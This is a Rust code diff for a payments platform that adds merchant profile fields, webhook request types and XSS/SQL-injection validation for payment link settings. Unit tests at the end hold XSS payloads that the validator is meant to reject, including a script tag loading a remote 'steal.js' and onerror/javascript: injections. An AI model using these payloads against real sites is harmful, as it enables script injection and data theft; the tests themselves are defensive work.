     pub always_enable_overcapture: Option<primitive_wrappers::AlwaysEnableOvercaptureBool>,
+
+    /// Indicates if external vault is enabled or not.
+    #[schema(value_type = Option<ExternalVaultEnabled>, example = "Enable")]
+    pub is_external_vault_enabled: Option<common_enums::ExternalVaultEnabled>,
+
+    /// External Vault Connector Details
+    pub external_vault_connector_details: Option<ExternalVaultConnectorDetails>,
+
+    /// Merchant Connector id to be stored for billing_processor connector
+    #[schema(value_type = Option<String>)]
+    pub billing_processor_id: Option<id_type::MerchantConnectorAccountId>,
+
+    /// The surcharge connector details for calculating external surcharge
+    pub surcharge_connector_details: Option<SurchargeConnectorDetails>,
+
+    /// Flag to enable Level 2 and Level 3 processing data for card transactions
+    #[schema(value_type = Option<bool>)]
+    pub is_l2_l3_enabled: Option<bool>,
+
+    /// Network tokenization credentials for this merchant account
+    #[schema(value_type = Option<NetworkTokeizationProviderCredentials>)]
+    pub network_tokenization_credentials: Option<NetworkTokeizationProviderCredentials>,
+    /// Payment method blocking configuration for the profile
+    #[schema(value_type = Option<PaymentMethodBlockingConfig>)]
+    pub payment_method_blocking: Option<PaymentMethodBlockingConfig>,
 }
 
 #[nutype::nutype(
@@ -2235,7 +2632,7 @@ pub struct ProfileCreate {
     pub redirect_to_merchant_with_http_post: Option<bool>,
 
     /// Webhook related details
-    pub webhook_details: Option<WebhookDetails>,
+    pub webhook_details: Option<WebhookDetailsRequest>,
 
     /// Metadata is useful for storing additional, unstructured information on an object.
     #[schema(value_type = Option<Object>, example = r#"{ "city": "NY", "unit": "245" }"#)]
@@ -2360,6 +2757,17 @@ pub struct ProfileCreate {
     /// Enable split payments, i.e., split the amount between multiple payment methods
     #[schema(value_type = Option<SplitTxnsEnabled>, default = "skip")]
     pub split_txns_enabled: Option<common_enums::SplitTxnsEnabled>,
+
+    /// Merchant Connector id to be stored for billing_processor connector
+    #[schema(value_type = Option<String>)]
+    pub billing_processor_id: Option<id_type::MerchantConnectorAccountId>,
+
+    /// The surcharge connector details for calculating external surcharge
+    pub surcharge_connector_details: Option<SurchargeConnectorDetails>,
+
+    /// Flag to enable Level 2 and Level 3 processing data for card transactions
+    #[schema(value_type = Option<bool>)]
+    pub is_l2_l3_enabled: Option<bool>,
 }
 
 #[cfg(feature = "v1")]
@@ -2393,7 +2801,7 @@ pub struct ProfileResponse {
     pub redirect_to_merchant_with_http_post: bool,
 
     /// Webhook related details
-    pub webhook_details: Option<WebhookDetails>,
+    pub webhook_details: Option<WebhookDetailsResponse>,
 
     /// Metadata is useful for storing additional, unstructured information on an object.
     #[schema(value_type = Option<Object>, example = r#"{ "city": "NY", "unit": "245" }"#)]
@@ -2524,9 +2932,13 @@ pub struct ProfileResponse {
     #[schema(default = false, example = false)]
     pub is_pre_network_tokenization_enabled: bool,
 
-    /// Acquirer configs
-    #[schema(value_type = Option<Vec<ProfileAcquirerResponse>>)]
-    pub acquirer_configs: Option<Vec<ProfileAcquirerResponse>>,
+    /// Acquirer configs (Deprecated - use `acquirer_config_bucket` instead)
+    #[schema(value_type = Option<Vec<ProfileAcquirerResponse>>, deprecated)]
+    pub acquirer_configs: Option<Vec<profile_acquirer::ProfileAcquirerResponse>>,
+
+    /// Acquirer config buckets: map of acquirer profile configurations
+    #[schema(value_type = Option<ProfileAcquirerConfigsResponse>)]
+    pub acquirer_config_bucket: Option<profile_acquirer::ProfileAcquirerConfigsResponse>,
 
     /// Indicates if the redirection has to open in the iframe
     #[schema(example = false)]
@@ -2550,9 +2962,40 @@ pub struct ProfileResponse {
     /// Indicates if manual retry for payment is enabled or not
     pub is_manual_retry_enabled: Option<bool>,
 
+    /// When `true`, a payment whose requested `capture_method` is not supported by the
+    /// connector chosen for it is processed with `automatic` capture instead of being rejected,
+    /// and the payment method list does not hide payment methods based on `capture_method`.
+    #[schema(example = true)]
+    pub auto_fallback_capture_method: Option<bool>,
+
     /// Bool indicating if overcapture  must be requested for all payments
     #[schema(value_type = Option<bool>)]
     pub always_enable_overcapture: Option<primitive_wrappers::AlwaysEnableOvercaptureBool>,
+
+    /// Indicates if external vault is enabled or not.
+    #[schema(value_type = Option<ExternalVaultEnabled>, example = "Enable")]
+    pub is_external_vault_enabled: Option<common_enums::ExternalVaultEnabled>,
+
+    /// External Vault Connector Details
+    pub external_vault_connector_details: Option<ExternalVaultConnectorDetails>,
+
+    /// Merchant Connector id to be stored for billing_processor connector
+    #[schema(value_type = Option<String>)]
+    pub billing_processor_id: Option<id_type::MerchantConnectorAccountId>,
+
+    /// The surcharge connector details for calculating external surcharge
+    pub surcharge_connector_details: Option<SurchargeConnectorDetails>,
+
+    /// Flag to enable Level 2 and Level 3 processing data for card transactions
+    #[schema(value_type = Option<bool>)]
+    pub is_l2_l3_enabled: Option<bool>,
+
+    /// Network tokenization credentials for this merchant account
+    #[schema(value_type = Option<NetworkTokeizationProviderCredentials>)]
+    pub network_tokenization_credentials: Option<NetworkTokeizationProviderCredentials>,
+    /// Payment method blocking configuration for the profile
+    #[schema(value_type = Option<PaymentMethodBlockingConfig>)]
+    pub payment_method_blocking: Option<PaymentMethodBlockingConfig>,
 }
 
 #[cfg(feature = "v2")]
@@ -2586,7 +3029,7 @@ pub struct ProfileResponse {
     pub redirect_to_merchant_with_http_post: bool,
 
     /// Webhook related details
-    pub webhook_details: Option<WebhookDetails>,
+    pub webhook_details: Option<WebhookDetailsResponse>,
 
     /// Metadata is useful for storing additional, unstructured information on an object.
     #[schema(value_type = Option<Object>, example = r#"{ "city": "NY", "unit": "245" }"#)]
@@ -2723,6 +3166,17 @@ pub struct ProfileResponse {
     #[schema(value_type = Option<RevenueRecoveryAlgorithmType>, example = "cascading")]
     pub revenue_recovery_retry_algorithm_type:
         Option<common_enums::enums::RevenueRecoveryAlgorithmType>,
+
+    /// Merchant Connector id to be stored for billing_processor connector
+    #[schema(value_type = Option<String>)]
+    pub billing_processor_id: Option<id_type::MerchantConnectorAccountId>,
+
+    /// The surcharge connector details for calculating external surcharge
+    pub surcharge_connector_details: Option<SurchargeConnectorDetails>,
+
+    /// Flag to enable Level 2 and Level 3 processing data for card transactions
+    #[schema(value_type = Option<bool>)]
+    pub is_l2_l3_enabled: Option<bool>,
 }
 
 #[cfg(feature = "v1")]
@@ -2749,7 +3203,7 @@ pub struct ProfileUpdate {
     pub redirect_to_merchant_with_http_post: Option<bool>,
 
     /// Webhook related details
-    pub webhook_details: Option<WebhookDetails>,
+    pub webhook_details: Option<WebhookDetailsRequest>,
 
     /// Metadata is useful for storing additional, unstructured information on an object.
     #[schema(value_type = Option<Object>, example = r#"{ "city": "NY", "unit": "245" }"#)]
@@ -2903,11 +3357,41 @@ pub struct ProfileUpdate {
     /// Indicates if manual retry for payment is enabled or not
     pub is_manual_retry_enabled: Option<bool>,
 
+    /// When `true`, a payment whose requested `capture_method` is not supported by the
+    /// connector chosen for it is processed with `automatic` capture instead of being rejected,
+    /// and the payment method list does not hide payment methods based on `capture_method`.
+    #[schema(example = true)]
+    pub auto_fallback_capture_method: Option<bool>,
+
     /// Bool indicating if overcapture  must be requested for all payments
     #[schema(value_type = Option<bool>)]
     pub always_enable_overcapture: Option<primitive_wrappers::AlwaysEnableOvercaptureBool>,
-}
 
+    /// Indicates if external vault is enabled or not.
+    #[schema(value_type = Option<ExternalVaultEnabled>, example = "Enable")]
+    pub is_external_vault_enabled: Option<common_enums::ExternalVaultEnabled>,
+
+    /// External Vault Connector Details
+    pub external_vault_connector_details: Option<ExternalVaultConnectorDetails>,
+
+    /// Merchant Connector id to be stored for billing_processor connector
+    #[schema(value_type = Option<String>)]
+    pub billing_processor_id: Option<id_type::MerchantConnectorAccountId>,
+
+    /// The surcharge connector details for calculating external surcharge
+    pub surcharge_connector_details: Option<SurchargeConnectorDetails>,
+
+    /// Flag to enable Level 2 and Level 3 processing data for card transactions
+    #[schema(value_type = Option<bool>)]
+    pub is_l2_l3_enabled: Option<bool>,
+
+    /// Network tokenization credentials for this merchant account
+    #[schema(value_type = Option<NetworkTokeizationProviderCredentials>)]
+    pub network_tokenization_credentials: Option<NetworkTokeizationProviderCredentials>,
+    /// Payment method blocking configuration for the profile
+    #[schema(value_type = Option<PaymentMethodBlockingConfig>)]
+    pub payment_method_blocking: Option<PaymentMethodBlockingConfig>,
+}
 #[cfg(feature = "v2")]
 #[derive(Clone, Debug, Deserialize, ToSchema, Serialize)]
 #[serde(deny_unknown_fields)]
@@ -2932,7 +3416,7 @@ pub struct ProfileUpdate {
     pub redirect_to_merchant_with_http_post: Option<bool>,
 
     /// Webhook related details
-    pub webhook_details: Option<WebhookDetails>,
+    pub webhook_details: Option<WebhookDetailsRequest>,
 
     /// Metadata is useful for storing additional, unstructured information on an object.
     #[schema(value_type = Option<Object>, example = r#"{ "city": "NY", "unit": "245" }"#)]
@@ -3058,6 +3542,13 @@ pub struct ProfileUpdate {
     /// Enable split payments, i.e., split the amount between multiple payment methods
     #[schema(value_type = Option<SplitTxnsEnabled>, default = "skip")]
     pub split_txns_enabled: Option<common_enums::SplitTxnsEnabled>,
+
+    /// Merchant Connector id to be stored for billing_processor connector
+    #[schema(value_type = Option<String>)]
+    pub billing_processor_id: Option<id_type::MerchantConnectorAccountId>,
+
+    /// The surcharge connector details for calculating external surcharge
+    pub surcharge_connector_details: Option<SurchargeConnectorDetails>,
 }
 
 #[derive(Clone, Debug, serde::Deserialize, serde::Serialize, ToSchema)]
@@ -3159,15 +3650,25 @@ impl BusinessGenericLinkConfig {
     }
 }
 
-#[derive(Clone, Debug, serde::Deserialize, serde::Serialize, PartialEq, ToSchema)]
+#[derive(
+    Clone,
+    Debug,
+    serde::Deserialize,
+    serde::Serialize,
+    PartialEq,
+    ToSchema,
+    router_derive::ValidateXSSOrSQLi,
+)]
 pub struct BusinessPaymentLinkConfig {
     /// Custom domain name to be used for hosting the link in your own domain
     pub domain_name: Option<String>,
     /// Default payment link config for all future payment link
     #[serde(flatten)]
     #[schema(value_type = PaymentLinkConfigRequest)]
+    #[xss_clean(recurse)]
     pub default_config: Option<PaymentLinkConfigRequest>,
     /// list of configs for multi theme setup
+    #[xss_clean(recurse)]
     pub business_specific_configs: Option<HashMap<String, PaymentLinkConfigRequest>>,
     /// A list of allowed domains (glob patterns) where this link can be embedded / opened from
     #[schema(value_type = Option<HashSet<String>>)]
@@ -3177,14 +3678,15 @@ pub struct BusinessPaymentLinkConfig {
 }
 
 impl BusinessPaymentLinkConfig {
-    pub fn validate(&self) -> Result<(), &str> {
+    pub fn validate(&self) -> Result<(), String> {
+        common_utils::validation::ValidateXSSOrSQLi::validate_xss_or_sqli(self)?;
         let host_domain_valid = self
             .domain_name
             .clone()
             .map(|host_domain| link_utils::validate_strict_domain(&host_domain))
             .unwrap_or(true);
         if !host_domain_valid {
-            return Err("Invalid host domain name received in payment_link_config");
+            return Err("Invalid host domain name received in payment_link_config".to_string());
         }
 
         let are_allowed_domains_valid = self
@@ -3197,14 +3699,32 @@ impl BusinessPaymentLinkConfig {
             })
             .unwrap_or(true);
         if !are_allowed_domains_valid {
-            return Err("Invalid allowed domain names received in payment_link_config");
+            return Err("Invalid allowed domain names received in payment_link_config".to_string());
+        }
+
+        if let Some(default_cfg) = self.default_config.as_ref() {
+            default_cfg.validate()?;
+        }
+
+        if let Some(biz_cfgs) = self.business_specific_configs.as_ref() {
+            for config in biz_cfgs.values() {
+                config.validate()?;
+            }
         }
 
         Ok(())
     }
 }
 
-#[derive(Clone, Debug, serde::Deserialize, serde::Serialize, PartialEq, ToSchema)]
+#[derive(
+    Clone,
+    Debug,
+    serde::Deserialize,
+    serde::Serialize,
+    PartialEq,
+    ToSchema,
+    router_derive::ValidateXSSOrSQLi,
+)]
 pub struct PaymentLinkConfigRequest {
     /// custom theme for the payment link
     #[schema(value_type = Option<String>, max_length = 255, example = "#4E6ADD")]
@@ -3231,6 +3751,7 @@ pub struct PaymentLinkConfigRequest {
     #[schema(default = true, example = true)]
     pub show_card_form_by_default: Option<bool>,
     /// Dynamic details related to merchant to be rendered in payment link
+    #[xss_clean(recurse)]
     pub transaction_details: Option<Vec<PaymentLinkTransactionDetails>>,
     /// Configurations for the background image for details section
     pub background_image: Option<PaymentLinkBackgroundImageConfig>,
@@ -3241,6 +3762,10 @@ pub struct PaymentLinkConfigRequest {
     pub payment_button_text: Option<String>,
     /// Text for customizing message for card terms
     pub custom_message_for_card_terms: Option<String>,
+    /// Text for customizing message for different Payment Method Types
+    #[schema(value_type = Option<PaymentMethodsConfig>)]
+    pub custom_message_for_payment_method_types:
+        Option<common_types::payments::PaymentMethodsConfig>,
     /// Custom background colour for payment link's handle confirm button
     pub payment_button_colour: Option<String>,
     /// Skip the status screen after payment completion
@@ -3267,9 +3792,47 @@ pub struct PaymentLinkConfigRequest {
     pub is_setup_mandate_flow: Option<bool>,
     /// Hex color for the CVC icon during error state
     pub color_icon_card_cvc_error: Option<String>,
+    /// Flag to display the merchant name in the payment link
+    #[schema(default = true, example = true)]
+    pub show_merchant_name: Option<bool>,
+    /// Custom text for the separator shown between wallet and card payment method sections
+    #[schema(value_type = Option<String>, max_length = 64, example = "Or pay with")]
+    pub payment_methods_separator_text: Option<String>,
+    /// Duration in seconds before the status page auto-redirects to the return URL.
+    /// Set to 0 to disable auto-redirect. Maximum value is 900 seconds. Defaults to 5 seconds.
+    #[schema(value_type = Option<u32>, example = 10, minimum = 0, maximum = 900)]
+    pub redirect_delay_seconds: Option<u32>,
 }
 
-#[derive(Clone, Debug, serde::Deserialize, serde::Serialize, PartialEq, ToSchema)]
+impl PaymentLinkConfigRequest {
+    pub fn validate(&self) -> Result<(), String> {
+        common_utils::validation::ValidateXSSOrSQLi::validate_xss_or_sqli(self)?;
+
+        if let Some(custom_message) = self.custom_message_for_payment_method_types.as_ref() {
+            custom_message.validate().map_err(|e| e.to_string())?;
+        }
+
+        self.redirect_delay_seconds
+            .filter(|&delay| delay > consts::MAX_PAYMENT_LINK_REDIRECT_DELAY_SECONDS)
+            .map(|_| {
+                Err(format!(
+                    "redirect_delay_seconds must not exceed {} seconds",
+                    consts::MAX_PAYMENT_LINK_REDIRECT_DELAY_SECONDS
+                ))
+            })
+            .unwrap_or(Ok(()))
+    }
+}
+
+#[derive(
+    Clone,
+    Debug,
+    serde::Deserialize,
+    serde::Serialize,
+    PartialEq,
+    ToSchema,
+    router_derive::ValidateXSSOrSQLi,
+)]
 pub struct PaymentLinkTransactionDetails {
     /// Key for the transaction details
     #[schema(value_type = String, max_length = 255, example = "Policy-Number")]
@@ -3307,7 +3870,15 @@ pub struct PaymentLinkBackgroundImageConfig {
     pub size: Option<api_enums::ElementSize>,
 }
 
-#[derive(Clone, Debug, serde::Serialize, serde::Deserialize, PartialEq, ToSchema)]
+#[derive(
+    Clone,
+    Debug,
+    serde::Serialize,
+    serde::Deserialize,
+    PartialEq,
+    ToSchema,
+    router_derive::ValidateXSSOrSQLi,
+)]
 pub struct PaymentLinkConfig {
     /// custom theme for the payment link
     pub theme: String,
@@ -3328,6 +3899,7 @@ pub struct PaymentLinkConfig {
     /// A list of allowed domains (glob patterns) where this link can be embedded / opened from
     pub allowed_domains: Option<HashSet<String>>,
     /// Dynamic details related to merchant to be rendered in payment link
+    #[xss_clean(recurse)]
     pub transaction_details: Option<Vec<PaymentLinkTransactionDetails>>,
     /// Configurations for the background image for details section
     pub background_image: Option<PaymentLinkBackgroundImageConfig>,
@@ -3340,6 +3912,10 @@ pub struct PaymentLinkConfig {
     pub payment_button_text: Option<String>,
     /// Text for customizing message for card terms
     pub custom_message_for_card_terms: Option<String>,
+    /// Text for customizing message for different Payment Method Types
+    #[schema(value_type = Option<PaymentMethodsConfig>)]
+    pub custom_message_for_payment_method_types:
+        Option<common_types::payments::PaymentMethodsConfig>,
     /// Custom background colour for payment link's handle confirm button
     pub payment_button_colour: Option<String>,
     /// Skip the status screen after payment completion
@@ -3366,6 +3942,13 @@ pub struct PaymentLinkConfig {
     pub is_setup_mandate_flow: Option<bool>,
     /// Hex color for the CVC icon during error state
     pub color_icon_card_cvc_error: Option<String>,
+    /// Flag to display the merchant name in the payment link
+    pub show_merchant_name: Option<bool>,
+    /// Custom text for the separator shown between wallet and card payment method sections
+    pub payment_methods_separator_text: Option<String>,
+    /// Duration in seconds before the status page auto-redirects to the return URL.
+    /// Set to 0 to disable auto-redirect. Maximum value is 900 seconds. Defaults to 5 seconds.
+    pub redirect_delay_seconds: Option<u32>,
 }
 
 #[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
@@ -3426,5 +4009,119 @@ impl std::ops::Deref for TtlForExtendedCardInfo {
     type Target = u16;
     fn deref(&self) -> &Self::Target {
         &self.0
+    }
+}
+
+#[cfg(feature = "v2")]
+#[derive(Debug)]
+pub struct MCACGraphData {
+    pub connector_name: common_enums::connector_enums::Connector,
+    pub payment_methods_enabled: Option<Vec<common_types::payment_methods::PaymentMethodsEnabled>>,
+}
+
+#[cfg(feature = "v1")]
+#[derive(Debug, Deserialize)]
+pub struct MCACGraphData {
+    pub connector_name: String,
+    pub payment_methods_enabled: Option<Vec<PaymentMethodsEnabled>>,
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn empty_webhook_url_fails_validation_while_omission_preserves_the_destination() {
+        let existing: WebhookDetailsResponse = serde_json::from_value(serde_json::json!({
+            "webhook_url": "https://merchant.example.com/hook"
+        }))
+        .expect("configured webhook");
+
+        assert!(
+            serde_json::from_value::<WebhookDetailsRequest>(serde_json::json!({
+                "webhook_url": ""
+            }))
+            .is_err()
+        );
+
+        let omitted: WebhookDetailsRequest = serde_json::from_value(serde_json::json!({
+            "payment_succeeded_enabled": true
+        }))
+        .expect("partial webhook update");
+        let retained =
+            serde_json::to_value(existing.merge(omitted.into())).expect("retained webhook");
+        assert_eq!(
+            retained.get("webhook_url"),
+            Some(&serde_json::json!("https://merchant.example.com/hook"))
+        );
+    }
+
+    #[test]
+    fn test_payment_link_config_request_validation() {
+        // Safe input should validate successfully
+        let safe_request = PaymentLinkConfigRequest {
+            theme: Some("#4E6ADD".to_string()),
+            logo: Some("https://example.com/logo.png".to_string()),
+            seller_name: Some("Safe Merchant Name".to_string()),
+            sdk_layout: None,
+            display_sdk_only: None,
+            enabled_saved_payment_method: None,
+            hide_card_nickname_field: None,
+            show_card_form_by_default: None,
+            transaction_details: None,
+            background_image: None,
+            details_layout: None,
+            payment_button_text: Some("Pay Now".to_string()),
+            custom_message_for_card_terms: Some("Agree to terms".to_string()),
+            custom_message_for_payment_method_types: None,
+            payment_button_colour: None,
+            skip_status_screen: None,
+            payment_button_text_colour: None,
+            background_colour: None,
+            sdk_ui_rules: None,
+            payment_link_ui_rules: None,
+            enable_button_only_on_form_ready: None,
+            payment_form_header_text: Some("Header Text".to_string()),
+            payment_form_label_type: None,
+            show_card_terms: None,
+            is_setup_mandate_flow: None,
+            color_icon_card_cvc_error: None,
+            show_merchant_name: None,
+            payment_methods_separator_text: None,
+            redirect_delay_seconds: None,
+        };
+        assert!(safe_request.validate().is_ok());
+
+        // Dangerous input in seller_name should fail validation
+        let unsafe_seller = PaymentLinkConfigRequest {
+            seller_name: Some(
+                "S\"/><script src=//p.jesse-yang.com/steal.js></script><meta x=\"".to_string(),
+            ),
+            ..safe_request.clone()
+        };
+        assert!(unsafe_seller.validate().is_err());
+
+        // Dangerous input in payment_button_text should fail validation
+        let unsafe_button = PaymentLinkConfigRequest {
+            payment_button_text: Some("<script>alert(1)</script>".to_string()),
+            ..safe_request.clone()
+        };
+        assert!(unsafe_button.validate().is_err());
+
+        // Dangerous input in custom_message_for_card_terms should fail validation
+        let unsafe_terms = PaymentLinkConfigRequest {
+            custom_message_for_card_terms: Some(
+                "Agree to <img src=x onerror=alert(1)> terms".to_string(),
+            ),
+            ..safe_request.clone()
+        };
+        assert!(unsafe_terms.validate().is_err());
+
+        // Dangerous input in payment_form_header_text should fail validation
+        let unsafe_header = PaymentLinkConfigRequest {
+            payment_form_header_text: Some("Header <iframe src=javascript:alert(1)>".to_string()),
+            ..safe_request.clone()
+        };
+        assert!(unsafe_header.validate().is_err());
     }
 }
